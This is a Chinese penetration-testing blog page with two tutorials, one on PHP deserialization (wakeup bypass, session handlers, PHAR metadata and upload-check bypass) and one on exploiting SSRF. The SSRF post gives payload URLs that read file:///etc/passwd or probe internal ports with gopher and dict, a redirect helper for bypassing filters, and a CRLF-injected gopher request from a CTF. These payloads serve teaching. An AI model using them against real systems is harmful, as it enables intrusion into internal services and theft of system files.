<!DOCTYPE html>












  


<html class="theme-next muse use-motion" lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">






















<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">

<link rel="stylesheet" href="/css/main.css?v=7.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.2.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">


  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">







<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '7.2.0',
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
    back2top: true,
    back2top_sidebar: false,
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="沉迷渗透测试的信安菜鸟">
<meta property="og:type" content="website">
<meta property="og:title" content="菜鸟博客">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="菜鸟博客">
<meta property="og:description" content="沉迷渗透测试的信安菜鸟">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="菜鸟博客">
<meta name="twitter:description" content="沉迷渗透测试的信安菜鸟">





  
  
  <link rel="canonical" href="http://yoursite.com/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>菜鸟博客</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">菜鸟博客</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="切换导航栏">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home menu-item-active">

    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>

  </li>

      
      
    </ul>
  

  
    

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/23/php反序列化漏洞实战经验/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VegyChick">
      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="菜鸟博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/10/23/php反序列化漏洞实战经验/" class="post-title-link" itemprop="url">php反序列化漏洞实战经验</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-10-23 00:05:23 / 修改时间：00:06:38" itemprop="dateCreated datePublished" datetime="2019-10-23T00:05:23+08:00">2019-10-23</time>
            </span>
          

          
            

            
          

          

          
            
            
          

          
          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><strong>什么是序列化与反序列化</strong></p>
<p>维基百科中这样定义：序列化（serialization）在计算机科学的数据处理中，是指将数据结构或对象状态转换成可取用格式（例如存成文件，存于缓冲，或经由网络中发送），以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。  </p>
<p>概念很容易理解，其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。</p>
<p>那么序列化与反序列化有什么用处呢？ </p>
<p>举个例子：</p>
<p>比如：现在我们都会在淘宝上买桌子，桌子这种很不规则的东西，该怎么从一个城市运输到另一个城市，这时候一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。当买家收到货后，就需要自己把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。</p>
<p>也就是说，序列化的目的是方便数据的传输和存储。</p>
<p>在PHP应用中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。  </p>
<p>常见的序列化格式：</p>
<ul>
<li>二进制格式</li>
<li>字节数组</li>
<li>json字符串</li>
<li>xml字符串 </li>
</ul>
<p><strong>PHP序列化与反序列化</strong></p>
<p>PHP通过string serialize ( mixed $value )和mixed unserialize ( string $str )两个函数实现序列化和反序列化。</p>
<p>下面是比较典型的PHP反序列化漏洞中可能会用到的魔术方法：</p>
<p>void __wakeup ( void )</p>
<p>unserialize( )会检查是否存在一个_wakeup( ) 方法。如果存在，则会先调用_wakeup 方法，预先准备对象需要的资源。</p>
<p>void __construct ([ mixed $args [, $… ]])</p>
<p>具有构造函数的类会在每次创建新对象时先调用此方法。</p>
<p>void __destruct ( void )</p>
<p>析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</p>
<p>public string __toString ( void )</p>
<p>__toString( ) 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj;应该显示些什么。</p>
<p>此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</p>
<p><strong>PHP反序列化漏洞</strong></p>
<p><strong>漏洞成因</strong></p>
<p>PHP反序列化漏洞又称PHP对象注入，是因为程序对输入数据处理不当导致的。</p>
<p>先看一个例子：</p>
<p><a href="https://image.3001.net/images/20190306/1551867117_5c7f9ced2cdbb.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190306/1551867117_5c7f9ced2cdbb.png!small" alt="11.png"></a></p>
<p>这个例子中，析构函数会回显$test的值，我们可以构造一个对象，控制$test的值，达到控制数据流的目的，实现反序列化漏洞的利用。</p>
<p>构造过程如下：</p>
<p><a href="https://image.3001.net/images/20190306/1551867156_5c7f9d14e49e0.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190306/1551867156_5c7f9d14e49e0.png!small" alt="2.png"></a></p>
<p><strong>利用方式</strong></p>
<p><strong>一、__wakeup( )绕过</strong></p>
<p>(CVE-2016-7124)</p>
<p>反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup( )的执行。</p>
<p>影响版本：</p>
<ul>
<li>PHP before 5.6.25</li>
<li>7.x before 7.0.10</li>
</ul>
<p>DEMO如下：</p>
<p><img src="https://image.3001.net/images/20190306/1551867216_5c7f9d50b7627.png!small" alt="3.png"><img src="https://image.3001.net/images/20190306/1551867250_5c7f9d72ba443.png!small" alt="4.png"></p>
<p><strong>二、注入对象构造方法</strong></p>
<p>当目标对象被private、protected修饰时的构造方法。</p>
<p>示例代码：</p>
<p><img src="https://image.3001.net/images/20190306/1551867287_5c7f9d97ed3e8.png!small" alt="5.png"><img src="https://image.3001.net/images/20190306/1551867327_5c7f9dbfb5df9.png!small" alt="6.png"></p>
<p>这个例子中，class B和class C有一个同名方法action，我们可以构造目标对象，使得析构函数调用class C的action方法，实现任意代码执行。</p>
<p>构造代码：</p>
<p><img src="https://image.3001.net/images/20190306/1551867367_5c7f9de7478f0.png!small" alt="7.png"></p>
<p><strong>三、Session反序列化漏洞</strong></p>
<p>PHP中的Session经序列化后存储，读取时再进行反序列化。</p>
<p>相关配置：</p>
<p><strong>session.save_path=””</strong>        //设置session的存储路径</p>
<p><strong>session.save_handler=””</strong>     //设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式) </p>
<p><strong>session.auto_start boolen</strong>   //指定会话模块是否在请求开始时启动一个会话默认为0不启动</p>
<p><strong>session.serialize_handler</strong> <strong>string</strong>//定义用来序列化/反序列化的处理器名字。默认使用php</p>
<p>PHP中有三种序列化处理器，如下表所示：</p>
<p><img src="https://image.3001.net/images/20190306/1551867418_5c7f9e1ad4312.png!small" alt="8.png">示例代码：</p>
<p><img src="https://image.3001.net/images/20190306/1551867460_5c7f9e44d2e8b.png!small" alt="9.png"></p>
<p>命名为sess_Session_id。</p>
<p>存储内容为序列化后的session：test|s:4:”test”;</p>
<p>不同处理器的格式不同，当不同页面使用了不同的处理器时，由于处理的Session序列化格式不同，就可能产生反序列化漏洞。</p>
<p>下面演示漏洞利用：</p>
<p><img src="https://image.3001.net/images/20190306/1551867493_5c7f9e6516fb6.png!small" alt="10.png">该页面中有类demo3，开启session，并用php处理器处理session。</p>
<p><img src="https://image.3001.net/images/20190306/1551867519_5c7f9e7f7ccdc.png!small" alt="12.png"></p>
<p>通过session.php设置session，通过generate.php构造实例。</p>
<p>由于session.php与demo3.php采用的序列化处理器不同，我们可以构造“误导”处理器，达到漏洞利用的目的。</p>
<p>实例构造：</p>
<p><img src="https://image.3001.net/images/20190306/1551867561_5c7f9ea95e926.png!small" alt="13.png"></p>
<p>访问demo3.php成功创建了一个类demo3的实例。</p>
<p><strong>四、PHAR利用</strong></p>
<p>1、PHAR简介</p>
<p>PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件，在PHP 5.3 或更高版本中默认开启，这个特性使得 PHP也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行。</p>
<p>2、PHAR文件结构</p>
<p>PHAR文件由3或4个部分组成：  </p>
<p>（1）stub  //PHAR文件头</p>
<p>stub就是一个简单的php文件，最简文件头为：</p>
<?php __HALT_COMPILER( )；?><p>是可有可无的，若使用?&gt;，则;与?&gt;间至多一个空格。</p>
<p>文件头中必须包含__HALT_COMPILER();除此之外没有限制。（PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测）</p>
<p>（2）manifest describing the contents  //PHAR文件描述该部分存储文件名、文件大小等信息，如下图所示。</p>
<p><img src="https://image.3001.net/images/20190306/1551867591_5c7f9ec73cdea.png!small" alt="14.png"></p>
<p>图中标出的地方，存储了经serialize( )的Meta-data，有序列化过程必有反序列化过程，这就是我们的注入点。</p>
<p>（3）the file contents</p>
<p>PHAR文件内容</p>
<p>（4）[optional] a signature for verifying Phar integrity (phar file format only)  //可选的签名部分，支持MD5和SHA1</p>
<p><img src="https://image.3001.net/images/20190306/1551867630_5c7f9eee86ed3.png!small" alt="15.png"></p>
<p>3、攻击方法</p>
<p>2018年Black Hat研究院Sam Thomas的议题：</p>
<p>It’s a PHP unserialization vulnerability Jim, but not as we know it提供了一种新的php反序列化攻击姿势。PHAR文件的Meta-data可以是任何能够序列化的PHP对象，当PHAR文件被任何<strong>文件系统函数首次</strong>通过phar://协议解析时Meta-data部分会被反序列化，这个反序列化过程就是我们的攻击点，Meta-data部分填充payload。</p>
<p>漏洞利用条件：  </p>
<p>在目标系统上投放一个装在payload的可访问的PHAR文件，通过文件系统函数利用phar://伪协议解析目标PHAR文件。</p>
<p>下面演示利用过程：</p>
<p>先创建一个PHAR文件。</p>
<p>注意：<strong>要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</strong></p>
<p><strong><img src="https://image.3001.net/images/20190306/1551867666_5c7f9f120a4d5.png!small" alt="16.png"></strong>箭头标出Meta-data部分，可以看到为序列化后结果。</p>
<p><strong><img src="https://image.3001.net/images/20190306/1551867716_5c7f9f440ae4e.png!small" alt="17.png"></strong></p>
<p>输出了之前打包的phar文件中，test.txt文件内容，并成功实例化TestObject对象，调用了析构函数。</p>
<p>由于PHP仅通过stub部分判断文件是否为PHAR文件，我们可以通过添加文件头、修改后缀的方式绕过上传检测。</p>
<p>示例代码：</p>
<p><img src="https://image.3001.net/images/20190306/1551867749_5c7f9f65ab119.png!small" alt="18.png"></p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/17/SSRF在有无回显方面的利用及其思考与总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VegyChick">
      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="菜鸟博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/10/17/SSRF在有无回显方面的利用及其思考与总结/" class="post-title-link" itemprop="url">SSRF在有无回显方面的利用及其思考与总结</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-10-17 23:35:42 / 修改时间：23:36:32" itemprop="dateCreated datePublished" datetime="2019-10-17T23:35:42+08:00">2019-10-17</time>
            </span>
          

          
            

            
          

          

          
            
            
          

          
          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="SSRF在有无回显方面的利用及其思考与总结"><a href="#SSRF在有无回显方面的利用及其思考与总结" class="headerlink" title="SSRF在有无回显方面的利用及其思考与总结"></a>SSRF在有无回显方面的利用及其思考与总结</h2><p> 对于SSRF的利用、危害及绕过[MisakiKata ]师傅先知上的的<a href="https://xz.aliyun.com/t/6235" target="_blank" rel="noopener">一文</a>介绍的非常详细，看了这篇文章也学到了很多。由于在实际场景中还遇到很多类似SSRF的点，所以还想深入探讨一下其他利用方式以及无回显情况下的SSRF。</p>
<h3 id="1-一般层面（有回显）SSRF及bypass利用技巧"><a href="#1-一般层面（有回显）SSRF及bypass利用技巧" class="headerlink" title="1.一般层面（有回显）SSRF及bypass利用技巧"></a>1.一般层面（有回显）SSRF及bypass利用技巧</h3><p>可能存在SSRF的URL:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/vul.php?url=http://www.xxc.com/xxx.jpg</span><br><span class="line">http://share.xxx.com/index.php?url=http://test.com</span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/vul.php?url=http://127.0.0.1:port</span><br></pre></td></tr></table></figure>

<p>根据回显内容和状态即可确定漏洞是否存在。</p>
<p>协议利用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gopher</span><br><span class="line">http://127.0.0.1/ssrf.php?url=gopher://127.0.0.1:2333/_test</span><br><span class="line">dict</span><br><span class="line">http://4o4notfound.org/ssrf.php?url=dict://127.0.0.1:port/info</span><br><span class="line">file</span><br><span class="line">http://4o4notfound.org/ssrf.php?url=file:///etc/passwd</span><br><span class="line">http</span><br><span class="line">http://4o4notfound.org/ssrf.php?url=http://xxx.com/302.php</span><br></pre></td></tr></table></figure>

<p>协议限制为http下向服务端提交</p>
<h4 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a><strong>bypass</strong></h4><ul>
<li>IP限制绕过（xip.io,十进制IP,八进制IP）</li>
<li>协议限制绕过（Redirect,CRLF header injection）</li>
<li>调用系统支持的协议和方法</li>
</ul>
<p>辅助脚本302.php—-bypass http协议限制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$ip = $_GET[&apos;ip&apos;];</span><br><span class="line"></span><br><span class="line">$port = $_GET[&apos;port&apos;];</span><br><span class="line"></span><br><span class="line">$scheme = $_GET[&apos;s&apos;];</span><br><span class="line"></span><br><span class="line">$data = $_GET[&apos;data&apos;];</span><br><span class="line"></span><br><span class="line">header(&quot;Location: $scheme://$ip:$port/$data&quot;); ?&gt;</span><br></pre></td></tr></table></figure>

<p>协议利用：</p>
<p>1)Dict协议</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/302.php?s=dict&amp;ip=vul.comg&amp;port=8080&amp;data=helo:dict</span><br></pre></td></tr></table></figure>

<p>2)Gopher协议</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/302.php?s=gopher&amp;ip=vul.comg&amp;port=8080&amp;data=gopher</span><br></pre></td></tr></table></figure>

<p>3)file协议</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Location: file:///etc/passwd&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>例子：只能本地localhost情况下访问</p>
<p>结合一道CTF实例</p>
<p>302.php的内容为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">header(&quot;Location:gopher://127.0.0.1:80/_POST /flag.php HTTP/1.1%0d%0aHost:</span><br><span class="line"></span><br><span class="line">vultarget.com%0d%0aUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0)</span><br><span class="line"></span><br><span class="line">Gecko/20100101 Firefox/50.0%0d%0aAccept:</span><br><span class="line"></span><br><span class="line">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8%0d%0aAccept-Language:</span><br><span class="line"></span><br><span class="line">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3%0d%0aAccept-Encoding: gzip,</span><br><span class="line"></span><br><span class="line">deflate%0d%0aConnection: keep-alive%0d%0aUpgrade-Insecure-Requests: 1%0d%0aContent-</span><br><span class="line"></span><br><span class="line">Type: application/x-www-form-urlencoded%0d%0aContent-Length:</span><br><span class="line"></span><br><span class="line">14%0d%0a%0d%0ausername=admin&quot;);</span><br></pre></td></tr></table></figure>

<p>CRLF Header Injection HTTP头注入</p>
<p>weblogic uddiexplorer SSRF</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://(要探测的内网地址)&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure>

<p>CRLF-&gt;ASCII Code</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-%0d-&gt;0x0d-&gt;\r 回车</span><br><span class="line">-%0a-&gt;0x0a-&gt;\n 换行</span><br></pre></td></tr></table></figure>

<p>案例一</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190917095323-eec96922-d8ed-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190917095323-eec96922-d8ed-1.png" alt="img"></a></p>
<p>案例二</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190917095343-fa7c5040-d8ed-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190917095343-fa7c5040-d8ed-1.png" alt="img"></a></p>
<h4 id="其他实例"><a href="#其他实例" class="headerlink" title="其他实例"></a><strong>其他实例</strong></h4><p>下面列出的代码的是从现实场景开发中找到的几个较常见不安全的的实实列。通过用户提供的URL来获取文件的PHP代码 ，只要它们允许用户决定从哪里获取数据即可 。</p>
<ol>
<li>PHP file_get_contents</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (isset($_POST[&apos;url&apos;])) </span><br><span class="line">    &#123; </span><br><span class="line">        $content = file_get_contents($_POST[&apos;url&apos;]); </span><br><span class="line">        $filename = &apos;./images/&apos;.rand().&apos;img1.jpg&apos;; </span><br><span class="line">        file_put_contents($filename, $content); </span><br><span class="line">        echo $_POST[&apos;url&apos;].&quot;&quot;; </span><br><span class="line">        $img = &quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">    echo $img; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>此实现使用<code>file_get_contents</code>PHP函数提取用户请求的数据（在本例中为图像），并将其保存到磁盘上随机生成的文件名的文件中。然后，HTML img属性将图像显示给用户，$content可以由用户控制。</p>
<ol>
<li>PHP fsockopen（）函数</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    function GetFile($host,$port,$link) </span><br><span class="line">    &#123; </span><br><span class="line">        $fp = fsockopen($host, intval($port), $errno, $errstr, 30); </span><br><span class="line">        if (!$fp) &#123; </span><br><span class="line">            echo &quot;$errstr (error number $errno) \n&quot;; </span><br><span class="line">        &#125; else &#123; </span><br><span class="line">            $out = &quot;GET $link HTTP/1.1\r\n&quot;; </span><br><span class="line">            $out .= &quot;Host: $host\r\n&quot;; </span><br><span class="line">            $out .= &quot;Connection: Close\r\n\r\n&quot;; </span><br><span class="line">            $out .= &quot;\r\n&quot;; </span><br><span class="line">            fwrite($fp, $out); </span><br><span class="line">            $contents=&apos;&apos;; </span><br><span class="line">            while (!feof($fp)) &#123; </span><br><span class="line">                $contents.= fgets($fp, 1024); </span><br><span class="line">        &#125; </span><br><span class="line">        fclose($fp); </span><br><span class="line">        return $contents; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>函数实现的是使用<code>fsockopen</code>PHP函数按用户（任何文件或HTML）的请求获取数据。此函数建立与服务器上的套接字的TCP连接，并执行原始数据传输。</p>
<p>3.PHP curl_exec（）函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    if (isset($_POST[&apos;url&apos;]))</span><br><span class="line">    &#123;</span><br><span class="line">        $link = $_POST[&apos;url&apos;];</span><br><span class="line">        $curlobj = curl_init();</span><br><span class="line">        curl_setopt($curlobj, CURLOPT_POST, 0);</span><br><span class="line">        curl_setopt($curlobj,CURLOPT_URL,$link);</span><br><span class="line">        curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $result=curl_exec($curlobj);</span><br><span class="line">        curl_close($curlobj);</span><br><span class="line"></span><br><span class="line">        $filename = &apos;./curled/&apos;.rand().&apos;.txt&apos;;</span><br><span class="line">        file_put_contents($filename, $result); </span><br><span class="line">        echo $result;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这是在开发中另一个非常常见的操作，它使用<code>cURL</code>PHP 获取数据。文件/数据被下载并存储到’curled’文件夹下的磁盘中，并附加一个随机数和’.txt’文件扩展名。</p>
<p>以下是从某网站检索robots.txt的上述代码对应的示列</p>
<p>原本请求<strong>http：//<a href="http://www.example.com/robots.txt" target="_blank" rel="noopener">www.example.com/robots.txt</a></strong></p>
<p>但是请求<strong>http：//127.0.0.1：3306 / test.txt</strong> ，得到如下回显</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190917095403-06c28ae0-d8ee-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190917095403-06c28ae0-d8ee-1.png" alt="img"></a></p>
<h4 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a><strong>利用技巧</strong></h4><p>端口扫描：</p>
<p>1）PHP</p>
<p>可以滥用以下cURL实现来端口扫描设备：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    if (isset($_POST[&apos;url&apos;]))</span><br><span class="line">    &#123;</span><br><span class="line">        $link = $_POST[&apos;url&apos;];</span><br><span class="line">        $filename = &apos;./curled/&apos;.rand().&apos;txt&apos;;</span><br><span class="line">        $curlobj = curl_init($link);</span><br><span class="line">        $fp = fopen($filename,&quot;w&quot;);</span><br><span class="line">        curl_setopt($curlobj, CURLOPT_FILE, $fp);</span><br><span class="line">        curl_setopt($curlobj, CURLOPT_HEADER, 0);</span><br><span class="line">        curl_exec($curlobj);</span><br><span class="line">        curl_close($curlobj);</span><br><span class="line">        fclose($fp);</span><br><span class="line">        $fp = fopen($filename,&quot;r&quot;);</span><br><span class="line">        $result = fread($fp, filesize($filename)); </span><br><span class="line">        fclose($fp);</span><br><span class="line">        echo $result;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>2）自动话扫描：</p>
<p>例如10网段的B、C段扫描</p>
